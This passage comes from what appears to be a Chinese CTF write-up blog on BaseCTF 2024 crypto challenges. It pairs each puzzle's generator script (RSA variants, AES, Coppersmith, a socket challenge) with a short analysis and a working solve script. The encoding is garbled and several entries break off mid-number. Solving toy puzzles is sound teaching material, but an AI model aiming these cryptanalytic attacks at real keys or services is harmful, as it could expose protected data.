0], [0, 1, 0], [0, 0, 1]] for i in range(3): for j in range(i+1, 3): upper[i][j] = getPrime(128) low[j][i] = getPrime(128) result = np.array(upper) @ np.array(low) return result A = np.array([[flag, 0, 0]] + matrix2) B = randomArray() C = randomArray() MAT = C @ A @ B print(point1) print(point2) print(MAT) ''' 65540596822333029826884315503808996273733737079814345540607878287618419734231 45151244176940366132774311848077675849486332018843894072137609985463616792271 [[9259505595451159514948336330303511539525155092949382077995385373332083424570340733825203563332256599256361679775371565817159463557158551820090084800254999338417057682355404780422980119717238594927467956675771042145306399815569005775907169857728757334979422594358 3700462282298785820527479428312072678870010244861115107206951164684911761755437333209293039456840068340334559453608012512177623936248784897843503284633804083281388001236742261832974291349480314135560368365574114042082002559069958228523318326290833422846224288247 20791012146351643571145217310876690226642338279942557085580439219377325884045305279931904540467264182713135410067252835618936836675270813727053937054168296298149405902638242278868020381541490973458957704137657413376043351193] [3802535350808074374431476757195874789213113083310705049856269457737583463559458126494122484246497049005001474007088865512110432486291568737501434666990689483191924384489484665070592656641925905986397402822195880143437724155134584374613878027218950975919679551229 1519642544380087919293814751485424198320747098741960781639133554268321708273309194651985562222274023623071346914239982055028526526058064787882720065775210796950963778381575914964024929110539407721461321785325399699126116201001806816030960662346173275101476487421 8538097185709421082644083672229287227818939415260987123718318427750267353075860559170390896769087600458156859498331152566368881938040799840806164389020986990994328370205184734637870147251004626759120887684269603636183629300] [17987668490992083132878642797176089621188858356259455169173987325310681186627844776077058221612169421636403546746899152917309634315569997105261046388995579843528014810244648968375990949478033964619008761814039733347955609163 7188579142941521685422767412932555782658469950638690886255638896617687421517941457682493542615460990114218059246938237257830976937359020731335958068934235967457123039874441635435388736524907036941379695243043923900290273902 40388963560266769813551191613694768219344365780650048155838802242681775019274045964917142477325170274191702615504062392461666558731638338001971723737440974198823443420018559746335727687]] ''' æ€è·¯ï¼šå’Œä¸Šé¢çš„ä¸€æ · exp import sympy as sp from Crypto.Util.number import * # å®šä¹‰çŸ©é˜µ c = sp.Matrix([ [ 9259505595451159514948336330303511539525155092949382077995385373332083424570340733825203563332256599256361679775371565817159463557158551820090084800254999338417057682355404780422980119717238594927467956675771042145306399815569005775907169857728757334979422594358, 3700462282298785820527479428312072678870010244861115107206951164684911761755437333209293039456840068340334559453608012512177623936248784897843503284633804083281388001236742261832974291349480314135560368365574114042082002559069958228523318326290833422846224288247, 20791012146351643571145217310876690226642338279942557085580439219377325884045305279931904540467264182713135410067252835618936836675270813727053937054168296298149405902638242278868020381541490973458957704137657413376043351193 ], [ 380253535080807437443147675719587478921311308331070504985626945773758346355945812649412248424649704900500147400708886551211043248629156873750143466699068948319192438448948466507059265664192590598639740282219588014343772415513458437","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:1:6","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"ez_rsa task from Crypto.Util.number import * import gmpy2 m=bytes_to_long(b'BaseCTF{th1s_is_fake_fl4g}') e=65537 p=getPrime(512) q=getPrime(512) n=p*q not_phi=(p+2)*(q+2) c=pow(m,e,n) print(n) print(not_phi) print(c) ''' 96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790344897976690691139671461342896437428086142262969360560293350630096355947291129943172939923835317907954465556018515239228081131167407674558849860647237317421 96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790384900615665394180812810697286554008262030049280213663390855887077502992804805794388166197820395507600028816810471093163466639673142482751115353389655533205 37077223015399348092851894372646658604740267343644217689655405286963638119001805842457783136228509659145024536105346167019011411567936952592106648947994192469223516127472421779354488529147931251709280386948262922098480060585438392212246591935850115718989480740299246709231437138646467532794139869741318202945 ''' æ€è·¯ï¼šè§£æ–¹ç¨‹ exp n=96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790344897976690691139671461342896437428086142262969360560293350630096355947291129943172939923835317907954465556018515239228081131167407674558849860647237317421 j=96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790384900615665394180812810697286554008262030049280213663390855887077502992804805794388166197820395507600028816810471093163466639673142482751115353389655533205 c=37077223015399348092851894372646658604740267343644217689655405286963638119001805842457783136228509659145024536105346167019011411567936952592106648947994192469223516127472421779354488529147931251709280386948262922098480060585438392212246591935850115718989480740299246709231437138646467532794139869741318202945 from Crypto.Util.number import * from sympy import * p,q=symbols('p q') eq1=Eq(p*q,n) eq2=Eq((p+2)*(q+2),j) sol=solve((eq1,eq2),(p,q)) print(sol) p=8141718443899971866435611383307659937822484107070436226370768656806495239448624178566680116128893503281864119780033117546021082236554869984932214653357543 q=11859601043451548704239065811750630150121409048356115322381859833767027517389301429046456876409906319499766276197893850146733170630849226147814156555750347 phi=(p-1)*(q-1) d=inverse(65537,phi) m=pow(c,d,n) print(long_to_bytes(m)) ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:1:7","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"helloCrypto task from Crypto.Util.number import * from Crypto.Cipher import AES from Crypto.Util.Padding import pad import random flag=b'BaseCTF{}' key=random.randbytes(16) print(bytes_to_long(key)) my_aes=AES.new(key=key,mode=AES.MODE_ECB) print(my_aes.encrypt(pad(flag,AES.block_size))) # key1 = 208797759953288399620324890930572736628 # c = b'U\\xcd\\xf3\\xb1 r\\xa1\\x8e\\x88\\x92Sf\\x8a`Sk],\\xa3(i\\xcd\\x11\\xd0D\\x1edd\\x16[\u0026\\x92@^\\xfc\\xa9(\\xee\\xfd\\xfb\\x07\\x7f:\\x9b\\x88\\xfe{\\xae' æ€è·¯ï¼šç®€å•çš„AESè§£å¯† exp from Crypto.Util.number import long_to_bytes from Crypto.Cipher import AES from Crypto.Util.Padding import unpad key1 = 208797759953288399620324890930572736628 ciphertext = b'U\\xcd\\xf3\\xb1 r\\xa1\\x8e\\x88\\x92Sf\\x8a`Sk],\\xa3(i\\xcd\\x11\\xd0D\\x1edd\\x16[\u0026\\x92@^\\xfc\\xa9(\\xee\\xfd\\xfb\\x07\\x7f:\\x9b\\x88\\xfe{\\xae' key = long_to_bytes(key1) my_aes = AES.new(key=key, mode=AES.MODE_ECB) plaintext = unpad(my_aes.decrypt(ciphertext), AES.block_size) print(plaintext) ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:1:8","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"week2ã®é¢˜ç›® ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:2:0","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"é“œåŒ  task from Crypto.Util.number import getPrime, bytes_to_long #from secret import flag flag=b'XXXX' p = getPrime(1024) q = getPrime(1024) n = p * q e = 65537 hint1 = p \u003e\u003e 721 hint2 = q % (2 ** 266) ct = pow(bytes_to_long(flag), e, n) print(hint1) print(hint2) print(n) print(ct) ''' hint1 = 14439249591349619691972392177790365247490839237199085979433418493254022567815148979672690178 hint2 = 90063199151369157959005663017593053931871580139169245885113098598755909124764417 n = 18347545778876678838092757800261556931131930866012101566000425608407193858675622059415995283684230959320874387944052648148677918542763633503231962873204645415818139345588988936580526094727943067102768943117592654029397879665312089518191052154267343886226820785206334238961064175118262578895847281575656290248049404047727756356910896332939145136942219317065063060070725033146788186604738271846183709127655298440696824683099637827282095133642324657860714680107691622056420045091586609974536644773286992447027164350612852922016376888380895187804771279035652496676089183636450028327097084911908336202253562671798012457461 ct = 15659576879410368237140555530527974801613150473447768911067611094143466009251385693099110691602954207905029692682380253595062935017486879899242785756448973466690818942065250284891341066578689696180061755610538867770441139827574063212967027249650509215685566103350688284041405586915563454117672061141919712416360596137520514412607512596079964611672166435592936417138352662031529414118312166411150736015788925026636845744110093161894267707446937939130745326244186579516665160036229715964182962542836836457885170975474737620430886449029488829662146456489724775166105816909257516908496172172266375617868819982791477888289 ''' åˆ†æï¼šå¾ˆç»å…¸çš„ä¸€ç§copperï¼Œå…¥é—¨ä¸éš¾ï¼ŒåŸé¢˜åº”è¯¥æ˜¯ä¸€ä¸ªå¤åŸåå·®äº†äº”å…­ä½çš„é¢˜ï¼Œè¿˜éœ€è¦çˆ†ç ´ï¼Œæ‡’å¾—å†™è„šæœ¬ï¼Œå°±ç”¨é‚£ä¸ªé¢˜çš„äº† exp from Crypto.Util.number import long_to_bytes, inverse # ç»™å‡ºçš„çº¿ç´¢å’Œå¯†æ–‡ h1 = 14439249591349619691972392177790365247490839237199085979433418493254022567815148979672690178 h2 = 90063199151369157959005663017593053931871580139169245885113098598755909124764417 n = 18347545778876678838092757800261556931131930866012101566000425608407193858675622059415995283684230959320874387944052648148677918542763633503231962873204645415818139345588988936580526094727943067102768943117592654029397879665312089518191052154267343886226820785206334238961064175118262578895847281575656290248049404047727756356910896332939145136942219317065063060070725033146788186604738271846183709127655298440696824683099637827282095133642324657860714680107691622056420045091586609974536644773286992447027164350612852922016376888380895187804771279035652496676089183636450028327097084911908336202253562671798012457461 c = 15659576879410368237140555530527974801613150473447768911067611094143466009251385693099110691602954207905029692682380253595062935017486879899242785756448973466690818942065250284891341066578689696180061755610538867770441139827574063212967027249650509215685566103350688284041405586915563454117672061141919712416360596137520514412607512596079964611672166435592936417138352662031529414118312166411150736015788925026636845744110093161894267707446937939130745326244186579516665160036229715964182962542836836457885170975474737620430886449029488829662146456489724775166105816909257516908496172172266375617868819982791477888289 e = 65537 mod=1\u003c\u003c266 '''sage mod = 1\u003c\u003c266 pl = n*inverse_mod(h2, mod) % mod pbar = (h1 \u003c\u003c 721) + pl print(pbar) mod=1\u003c\u003c266 pbar=159283759372043950279417056412033091802265743745598264436861098130148724970544195213191649166147459982084533577625625008771745438626676361992622620990322639458220384654337631035952464187940654223018174399784470272274817163374085649033913063346035230347024202079916218850411102021956717312895699841307436573429 PR.\u003cx\u003e = PolynomialRing(Zmod(n)) for i in range(64): f=pbar+(x*mod*64)+(i\u003c\u003c266) f=f.monic() pp=f.small_roots(X=2^454, beta=0.4) if pp: print(pp[0]) break ''' pbar=159283759372043950279417056412033091802265743745598264436861098130148724970544195213191649166147459982084533577625625008","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:2:1","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"basic task from Crypto.Util.number import * import socketserver import os import random import base64 import string flag = os.getenv('GZCTF_FLAG').encode() class Task(socketserver.BaseRequestHandler): def _recvall(self): BUFF_SIZE = 2048 data = b'' while True: part = self.request.recv(BUFF_SIZE) data += part if len(part) \u003c BUFF_SIZE: break return data.strip() def send(self, msg, newline=True): try: if newline: msg += b'\\n' self.request.sendall(msg) except: pass def recv(self): return self._recvall() def handle(self): printable_chars = string.ascii_letters + string.digits + string.punctuation optional=[b'A',b'B',b'C',b'D'] for _ in range(100): secret= ''.join(random.choices(printable_chars, k=16)).encode() select=random.choice(optional) self.send(select) enc=b'' if select==b'A': enc=base64.b64encode(secret) elif select==b'B': enc=secret.hex().encode() elif select==b'C': enc=bytes_to_long(secret) enc=str(enc).encode() elif select==b'D': enc=[i for i in secret] enc=str(enc).encode() self.send(enc) client_send=self.recv() if client_send!=secret: self.send(\"\\nYou wrong!!!!!\") exit() self.send(flag) self.send(b\"\\nConnection has been closed =.= \") self.request.close() class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): pass class ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass if __name__ == \"__main__\": HOST, PORT = '0.0.0.0', 9999 server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() åˆ†æï¼šä¸€ä¸ªè¦ç”¨pwnå»äº¤äº’çš„é¢˜ï¼Œç»™äº†å››ç§åŠ å¯†æ–¹å¼ï¼Œä»–ç»™ä»€ä¹ˆï¼Œä½ è¿”å›ä»€ä¹ˆçš„è§£å¯†ç­”æ¡ˆï¼Œç„¶åä¸€ç™¾æ¬¡å°±è¡Œäº†ï¼Œç›´æ¥å†™è„šæœ¬ï¼Œå¦‚æœæ²¡æœ‰winç¯å¢ƒæ²¡æœ‰å®‰è£…pwnçš„è¯pip install pwntools exp from pwn import * import base64 from Crypto.Util.number import * # è¿æ¥åˆ°æœåŠ¡ç«¯ p = remote('challenge.basectf.fun',42917) def decode(secret, select): if select == b'A': return base64.b64decode(secret) elif select == b'B': return bytes.fromhex(secret.decode()) elif select == b'C': return long_to_bytes(int(secret.decode())) else: return bytes(map(int, secret.decode()[1:-1].split(', '))) try: for _ in range(100): # æ¥æ”¶ç¼–ç æ–¹å¼ encoding_method = p.recv().strip() # æ¥æ”¶ç¼–ç åçš„â€œç§˜å¯†â€ encoded_secret = p.recv().strip() # è§£ç â€œç§˜å¯†â€ secret = decode(encoded_secret, encoding_method) # å‘é€è§£ç åçš„â€œç§˜å¯†â€ä»¥éªŒè¯ p.sendline(secret) # æˆåŠŸæ—¶ï¼Œæ¥æ”¶å¹¶æ‰“å° flag flag = p.recv().strip() print(f\"Flag: {flag}\") finally: p.close() ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:2:2","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"mid_math2 task import numpy as np from Crypto.Util.number import * a, b, c = [getPrime(128) for _ in range(3)] d, e, f, h, i, j = [getPrime(1024) for _ in range(6)] A = [[a, b, c], [d, e, f], [h, i, j]] flag = b\"flag{test_flag}\" flag = bytes_to_long(flag) def prod(myList): result = 1 for i in myList: result = result * i return result def randomArray(): upper = [[1, 0, 0], [0, 1, 0], [0, 0, 1]] low = [[1, 0, 0], [0, 1, 0], [0, 0, 1]] for i in range(3): for j in range(i+1, 3): upper[i][j] = getPrime(128) low[j][i] = getPrime(128) result = np.array(upper) @ np.array(low) return result e = getPrime(18) N = getPrime(1024) C = randomArray() #MAT = C @ A @ B MAT = C @ A c = pow(flag, e, prod(A[0])) print(MAT) print(f'c = {c}') print(f'e = {e}') ''' [[9194428734244577957135736828947112370812209206819996917633266069359894211949655026549592464237531352518967649750275097282532736237822915630766535634248987628113137246739472264614337707439494149796414126558156060870508338278038269649101921703583149322486905552569052814106532234864028314925118581658029792157851338427975728108000711353532410024128431635933014226306706319591106081211872 7052600738698435126221697697810087514520765619736355003187836563546493264420232197860875416948961661231812045406188307561458872254314061097960625042149316957446344556490001927621879295417925720004568332344856366002394724202261454916368122811414228043610804718983599804179657247820737462743875143882925818085495573474169110616761320858675303922740882169073395416895304752909979711051264 13094262565727554986668133240216117564284263232131011542877585146452802164148464500319291219458081531317231044962383872061004846788004747813785963603455919882739054992075130196548494850105124430477756818974520035883861936342117869122455996838023977818945511119955390136020375974150407580576040034808588694313922810340598787633148909527275716235390356737099830131958338026891256778602432] [7291452286171544741377496447735677778433522048452394999757158120018504601116506253897733192493798837108269469756414516913436198353934250444263790689101779479157541198872731006007031448329354826004420971505929629537584453480285628607579031078497417101681028600589030661495031531644755072500393418929237208836713910921969937998825721580514845395852889662758886414966066733340052235985735 5592919719754926663830816961667268104316637431189640788304536404157195458040686322901848820171568258023938724485177544141303597034389473064509506247034833050568643394732003598890104462382321956436508366359718039669456303596542945687737870352569084995858128262046585579724537002100295978230177579835256681774512205534970583421138287684468047290246482431883957170924203400422234299829407 10384135162743100269852365857770153822630076412853981379757028821332622753962517667857057209221058533163475030678127399042436975886694593504673386134198042731671320468065688239424934644173240507619471360908786669070898288638067852779718549009532013299792474712979659423962779677856135791013599792822988457540442172903145046394648862567656330868441373023488569784114231877910285319620037] [34946383530632295853235791100380055176686898072752599942691162027311662041417740482507624946631032260410440329949488242706004902881977357811370156793240362927747354453547446315050117795844866771053429455608334265986953931753411938119703800489233043034369650346216548318254326462336573090313788936967898128977445514764945671848611612198443909056919 26805677375585831510259621878357023272222175103906204143689109861471123435549853025410319713500257027420994041712736040084303902812241806295302385126726161281240831030434347236854521776375408982352155894199700974681768432734155312616453345950508256035721377179651166114898547487082749355033867559583905997404388549346221139007108462958001461826337 497689562776640505003875019493739498285890124432122140160880154788261787596989464524950633083323323737282232526131326119044770617177622619274987548499130087479804420987875243597556955199892863044451754402181681450376817910034711","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:2:3","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"random_primes task from Crypto.Util.number import * import random def gen_n(): primes=[getPrime(128) for _ in range(256)] n = 1 for i in range(100): n *= primes[random.randint(0,127)] return primes,n flag=b'BaseCTF{}' m=bytes_to_long(flag) assert len(flag)==45 primes,n = gen_n() e = 0x010001 c=pow(m,e,n) print(\"n =\",n) print(\"e =\",e) print(\"c =\",c) print(\"primes =\",primes) åˆ†æï¼šæ²¡å•¥å¥½è¯´çš„ï¼Œç›´æ¥å†™å°±è¡Œäº†ï¼Œ127ä¸ªéšæœºæ•°ä¸­éšæœºæŠ½äº†100è½®ï¼Œç›´æ¥ç”¨nå»%è¿™äº›éšæœºæ•°ï¼Œç„¶åç®—æ–°çš„nå’Œphi exp n = 78300669134090137852678272985826748552135227276632141248987049792032006306302216838913764274866303353208450204056303587307590215658369546155011362928706987241738494219541640893624036978156512506828463680671263486243620357332029975262649036988429673099480612452108805474703908926666372276084227948945557265663478215385708377783788570365632616043692339165126905185780780266966306548390661933964569191558132570743049563034138454687784280737515786647554373002062073506433019576711216881997114922882459590300118573321037403610889041169358378723253785685185468195113769538654602557963324567374538144099228383454092513581001676844948371535253876783418313588527754932166605066901072445123419390582818421290114496685300926300428214457517990285819930164112928731952543551128353453115448896272534889430898972420106066951673716649898254901175990616932072274131352817500432771246120044877003878221635833566879303044541045834038388997926347179939044765998585225912825579716411592564742018931576637831147018364052669287568321730785094397048548966924521616592554123755297954204221563101170233500051950508111908253332306439556638016218903032470713009804240601585082087048162066169084662644707376647151608352036058459491394516846894878416951958668053255135013274125427380981145860643060541753558111657169642936860264070256441807766713460296249602643758686033797758071121020245797758472562524923801634553187959279204425077723939301840341779998492203869115635533331664608105795918593153796830400602836307602218542060655621724654663459491663959746624660378618696497713505280314029154654750144247111545203758654611758984447921004347657793617842564871769622784844341157861486787088384957424536581508067582989224734241742351249915951485225249670040001204171856547596397427658888879993013652971335861824416084725435327931256774534973698438003593122194474117269397752225948596514379988893089239094703410940035417268946100231522267605729519374566776171026410423486906556493370843386314649478106704968479881781695360132024826936593194324539644886241562342997299649076507105518992946223028855705189458007533521138703343150937158114114218932400728424949936286443583797118636171187082834662757985896337364138817400612718422265665198024836586611857266616428913152399750688461692677751727389476785588380514444593900569311496880422405988762554852121131345538798688587092154717384294801026132314002251890156123191210398076704434510182202143578810771596233936298462366674592585338029819643973999567268938697218329734244529139548760101393715777276776940762681748317493543343685273831243829694914274003574509516149595004243952747746644961308054952235256037171151695870643020625268635139422461824974663101258586488528601193378268634713686606488503649923013225514905688326248009253372769118830036659383418890729585564557376820890036155588551064419189532686009173215470250197488274429655669070803391973941917017493224972246331391152287082983301776505925295294164201606063028946348118492358755684668733095242911870636074134633575423928967453742150728552560370847186174905012586984090885433727025000206871702482359563400504600567763564582739694873656581728461491373440639163666040518508819641244084238867282549191870081112768586762540287977817548140346798817430775010275964061529114139424317686620296832033309265702409802876815255731607798400127673166880859281784259402995434972992131101158600882460475931695668710417351337637612478180964570698492610372677176847071937542439765750578751925220375723373827393178629810215549480885217514819316424426943459039642952096990941480059597449017550988311939357225","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:2:4","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"two_squares task from Crypto.Util.number import * flag=b'BaseCTF{}' m=bytes_to_long(flag) p=getPrime(128) q=getPrime(128) n=p*q e=65537 c=pow(m,e,n) x=p^2+q^2 print(\"e =\",e) print(\"c =\",c) print(\"x =\",x) \"\"\" e = 65537 c = 42330675787206041757903427737108553993012805007294570657461042152628982126538 x = 209479773119142584969854470862023704936857416491817498021871883305658177375498 \"\"\" åˆ†æï¼šæœ€ç®€å•çš„ä¸€ä¸ªï¼Œsagemathé‡Œé¢æœ‰two_squaresçš„å‡½æ•°ï¼Œç”šè‡³è¿˜æœ‰3æ¬¡æ–¹çš„ exp e = 65537 c = 42330675787206041757903427737108553993012805007294570657461042152628982126538 x = 209479773119142584969854470862023704936857416491817498021871883305658177375498 #p,q=two_squares(x) #print(p,q) p=312730551067949919826003024531506165487 q=334184642896526518753506901808151350573 from Crypto.Util.number import * n=p*q m=pow(c,inverse(e,(p-1)*(q-1)),n) print(long_to_bytes(m)) ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:2:5","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"try_to_factor task from Crypto.Util.number import * import random flag=b'BaseCTF{}'+random.randbytes(64) m=bytes_to_long(flag) p,q,r,s,t=[getStrongPrime(512) for _ in range(5)] N=p*q*r*s*t n=p*q e=65537 c=pow(m,e,n) gift=random.randint(2,n)*(p-1)*(q-1)*(r-1)*(s-1)*(t-1) while gift%2==0: gift//=2 print(\"N =\",N) print(\"c =\",c) print(\"gift =\",gift) \"\"\" N = 162692163428762295773992659007654377270271126313772302197255271375236131917158614424426498628778734679898165422129699410934825650141972454562350664161510689489443251515884304101827584411577749250383438126881931889798597627663578045519256806107514170414321556291545302688028088470848270636776466672843710163017531472049823632822203461654253767303314505996071453898533003519236112138591066133289040889933161978131399309340741554076140734156174295730180874473301361701867633594222054688204666518058106672165786417002466165926062199279674267145233283545524775943767021416906072142236079753359492846480515376121887507681663761713445807717270089017438999615422884163666812016989696908657065537508715229685120221307021151610089917537155165897740417480127289719971512938348936259 c = 113962118676826667648935023618252851875440854724310328843964819392166304653581141146631375503931008732348730639629174670963727399860571217264854300057305570824097216782800531930906801885967717639795643406206813677461127762087560021634738167845077869308515223303820469892552545806179267969169748886980836435095 gift = 863514692222931709925579242743251211976114217396765747601042357918763818732391790491059528595917786523674732369068315533549380754409535403506339052401422249684188032949680148055803474336983973622610403448963752802490806614810077181934627694570685722842963961551889267501616799757825675192653489096007790143775773378495299981666657347802233798206597104474595281241837323214457344961462510183726339545608046357281265026013496037522835659867389206279894057481600882665189079672009577651494435000349624334685832217586703242422260870866432379257259316411280539845741932725104662417642890238587876489774492067722351467773093391502588019563488688309892102039611978767690653206664257400163618467825666105966072942726011447079204869750153256054140924951306811971422635104088608275908232688385437145325481792836532453258784103533536292492138405929815964841772656055397705840797739586953744563989819811944946916720655079908564653686456283647030055622241840292127096994325415897266379446446435164189216562921252341705747891518007710533906231225283309180960546212899099652226954393826875 \"\"\" åˆ†æï¼šæœ¬æ¥è¿™åº”è¯¥æ˜¯nå’Œphiå·²çŸ¥ç›´æ¥å»å¥—æ¨¡æ¿åˆ†è§£çš„ï¼Œä½†æ˜¯nabyå¸ˆå‚…é­”æ”¹äº†ä¸€ä¸‹ï¼Œå°†phiä¸­çš„2é™¤å®Œäº†ï¼Œé‚£å°±å¯¼è‡´æ— æ³•ç›´æ¥ä½¿ç”¨ï¼Œç„¶åç»™äº†ä¸€ä¸ªè®ºæ–‡ï¼Œåœ¨é‡Œé¢è®²äº†ä¸€ä¸ªç®—æ³•ï¼Œè‡ªå·±æ²¡æœ‰çœ‹åˆ°å¤ªæ‡‚ï¼Œå¤§æ¦‚çš„æ„æ€æ˜¯æˆ‘ä»¬è¦æ‰¾çš„æ˜¯éå¹³å‡¡å¹³æ–¹æ ¹ï¼Œé‚£ä¹ˆè¿™ä¸ªæ•°ç”¨aæ¥è¡¨ç¤ºï¼Œå°±æ˜¯ $$ a^2-1=(a+1)(a-1)=0 mod N ,(a+1)(a-1)=kN $$é‚£ä¹ˆæˆ‘ä»¬æ±‚è§£ç›´æ¥å·²çŸ¥ä¸€ä¸ªå¦ä¸€ä¸ªgcdå°±å¥½äº† exp from Crypto.Util.number import * N = 162692163428762295773992659007654377270271126313772302197255271375236131917158614424426498628778734679898165422129699410934825650141972454562350664161510689489443251515884304101827584411577749250383438126881931889798597627663578045519256806107514170414321556291545302688028088470848270636776466672843710163017531472049823632822203461654253767303314505996071453898533003519236112138591066133289040889933161978131399309340741554076140734156174295730180874473301361701867633594222054688204666518058106672165786417002466165926062199279674267145233283545524775943767021416906072142236079753359492846480515376121887507681663761713445807717270089017438999615422884163666812016989696908657065537508715229685120221307021151610089917537155165897740417480127289719971512938348936259 c = 113962118676826667648935023618252851875440854724310328843964819392166304653581141146631375503931008732348730639629174670963727399860571217264854300057305570824097216782800531930906801885967717639795643406206813677461127762087560021634738167845077869308515223303820469892552545806179267969169748886980836435095 gift = 8635146922229317099255792427432512119761142173967657476010423579187638187323917904910595285959177865236747323690683155335493807544095354035063390524","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:2:6","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"week3ã®é¢˜ç›® ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:3:0","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"æ²¡æœ‰nå•Š task from Crypto.Util.number import * import gmpy2 flag=b'BaseCTF{}' m=bytes_to_long(flag) p=getPrime(512) q=getPrime(512) n=p*q e=65537 phi=(p-1)*(q-1) d=gmpy2.invert(e,phi) c=pow(m,e,n) x=pow(n,e,c) print(\"c =\",c) print(\"e =\",e) print(\"d =\",d) print(\"x =\",x) ''' c = 52453423663797600504896811946820841317615798875871627840172711423749946998217916744135290476795328543876098295227017753117609268701786914053599060330837226980969490439739651088710549890669593587642238827462108900683237797139569260570711611781514337884756698142193277516649805710242748531658979160170193283558 e = 65537 d = 54297831548863701092644190086258072883163378307246681513317422545902442650340916001357605211715836911877651782099787873046987096258918495734824011752504203578982947618784736181975847356304742402103468329660346526185908618978851982007496096394151821403282347897417590596861323293706611997134962231129075032641 x = 40635864473997460751766935373772107585133301579524000836637683731949939348171187931595274511243052505604832873086269554842194695737052043633079044688826020656068356561856848814530947955429343483847291398607359454851926470168457852479044154798114087493843073091985855839008222762224952503563764527380033064437 ''' æ€è·¯ï¼šè¥¿ç“œæ¯çš„åŸé¢˜ï¼ŒäºŒé¡¹å¼å®šç† exp from Crypto.Util.number import * phic=euler_phi(c) dc=inverse_mod(e,phic) a=pow(hint,dc,c) n=int(a)+int(c) m=power_mod(c,d,n) print(long_to_bytes(m)) ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:3:1","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"æ²¡æœ‰nå•Špro task from Crypto.Util.number import * import gmpy2 flag=b'BaseCTF{}' m=bytes_to_long(flag) p=getPrime(128) q=getPrime(128) print(p,q) n=p*q e=65537 phi=(p-1)*(q-1) d=gmpy2.invert(e,phi) assert d\u003cphi c=pow(m,e,n) print(\"c =\",c) print(\"e =\",e) print(\"d =\",d) \"\"\" c = 78919950899709764543039048006935881842075789773495004639436106636461009323420 e = 65537 d = 13002488326322253055272696035053386340217207134816593767440035447757509399233 \"\"\" æ€è·¯ï¼šåˆ†è§£ä¹‹åå»å’Œä»–çˆ†äº† exp from Crypto.Util.number import long_to_bytes c = 78919950899709764543039048006935881842075789773495004639436106636461009323420 e = 65537 d = 13002488326322253055272696035053386340217207134816593767440035447757509399233 def find(factors): dic={1:[]} for factor in factors: for f in list(dic.keys()): ff=f*factor if ff not in dic: dic[ff]=dic[f]+[factor] return dic for k in range(2,e): if (e*d-1)%k==0: phi=(e*d-1)//k if phi.nbits()==256 and d\u003cphi and phi\u003ec: fac=list(factor(phi)) factors=[] for f in fac: ep=f[1] for _ in range(ep): factors.append(f[0]) dic=find(factors) for p_1 in list(dic.keys()): pp=p_1+1 if is_prime(p_1+1) and pp.nbits()==128: q_1=phi//p_1 if is_prime(q_1+1): print('find!') p=p_1+1 q=q_1+1 m=power_mod(c, d,p*q) print(long_to_bytes(m)) ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:3:2","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"exgcd task from Crypto.Util.number import * flag=b'BaseCTF{}' m=bytes_to_long(flag) p=getPrime(1024) q=getPrime(1024) n=p*q e1=3747 e2=2991 c1=pow(m,e1,n) c2=pow(m,e2,n) print(\"n =\",n) print(\"e1 =\",e1) print(\"e2 =\",e2) print(\"c1 =\",c1) print(\"c2 =\",c2) \"\"\" n = 27855350163093443890983002241607629119744539643165776358993469078731521668677421483556132628708836721737685936980427467856642738196111748018522018598646125626995613169001111504706363742194664774823604738939411512861441742683157275818500991834651769368178320088982759626122029956515159435424882855075032400667120376075618896752694718491438251810609878021717559466498493103257912108879328270813061231904227056671621363669388496383136964549879459562004569059185078204867346250733489663015417879915436157806942021693920206071715538430633494012923651469196048546309592946901609803631751035364478773126967010589504275776307 e1 = 3747 e2 = 2991 c1 = 24426579024062518665031958216110619832653602343205488454298659533869220501923184793828421371206493659949730138867555889074137026401207985428160803910695088081370233571905915349589146504374710444468715701305061060934519410886010929009297226496448218819742287990364436349188987723637449590579092391100714056589967894609950537021838172987840638735592599678186555961654312442380755963257875487240962193060914793587712733601168204859917001269928487633954556221987632934190217367502677285906521385169669644977192556145782303526375491484736352799180747403161343130663661867413380222714012960607473395828938694285120527085083 c2 = 